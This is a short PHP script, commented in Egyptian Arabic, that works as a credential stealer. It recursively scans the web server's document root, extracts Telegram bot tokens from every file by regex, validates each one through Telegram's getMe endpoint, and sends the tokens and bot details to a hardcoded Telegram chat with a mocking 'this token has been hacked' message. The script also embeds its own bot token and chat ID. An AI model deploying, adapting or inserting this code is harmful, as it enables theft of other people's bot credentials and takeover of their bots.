<?php
 
function modedev($token, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];
    
    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => 'Content-type: application/x-www-form-urlencoded',
            'content' => http_build_query($data)
        ]
    ];
    
    $context  = stream_context_create($options);
    $response = file_get_contents($url, false, $context);

    if ($response) {
        echo "تم إرسال الرسالة بنجاح.<br>";
    } else {
        echo "فيه مشكلة في إرسال الرسالة.<br>";
    }
}

function getBotInfo($token) {
    $url = "https://api.telegram.org/bot{$token}/getMe";
    $response = file_get_contents($url);
    
    if ($response) {
        $data = json_decode($response, true);
        
        if ($data['ok']) {
            $botInfo = $data['result'];
            return "🚀 اسم البوت: " . $botInfo['first_name'] . "\n" .
                   "🧑‍💻 اسم المستخدم بتاع البوت: @" . $botInfo['username'] . "\n" .
                   "🔑 البوت ID: " . $botInfo['id'] . "\n" .
                   "👨‍👩‍👧‍👦 اسم العيلة: " . (isset($botInfo['last_name']) ? $botInfo['last_name'] : 'مفيش') . "\n";
        } else {
            return "⚠️ التوكن ده مش صحيح أو في مشكلة: " . $data['description'] . "\n";
        }
    } else {
        return "❌ فيه مشكلة في التواصل مع API بتاع تلجرام.\n";
    }
}

function extractTokens($text) {
    $pattern = '/\b\d{10}:[A-Za-z0-9_-]{35,}\b/';
    preg_match_all($pattern, $text, $matches);
    return array_unique($matches[0]);
}

function listAndExtractTokens($dir, $botToken, $chatId) {
    if (is_dir($dir)) {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        
        foreach ($files as $file) {
            if ($file->isFile()) {
                $fileContent = file_get_contents($file->getRealPath());
                $tokens = extractTokens($fileContent);

                if ($tokens) {
                    foreach ($tokens as $token) {
                        $botInfoMessage = getBotInfo($token);
                        $message = "🔑 توكن البوت: {$token}\n\n" . $botInfoMessage . "\n🚨 تم اختراق التوكن ده! 😱\n😂 قولنا لك لا تدخل في المشاكل دي!";
                        modedev($botToken, $chatId, $message);
                    }
                }
            }
        }
    }
}

$dirPath = $_SERVER['DOCUMENT_ROOT'];
$groupChatId = "4833974868"; // ايديك
$botToken = "7541013461:AAEdHdziZOUk2IUc46Ti-ts1fbss-NaHYu4"; // التوكن بتاع البوت

listAndExtractTokens($dirPath, $botToken, $groupChatId);
?>
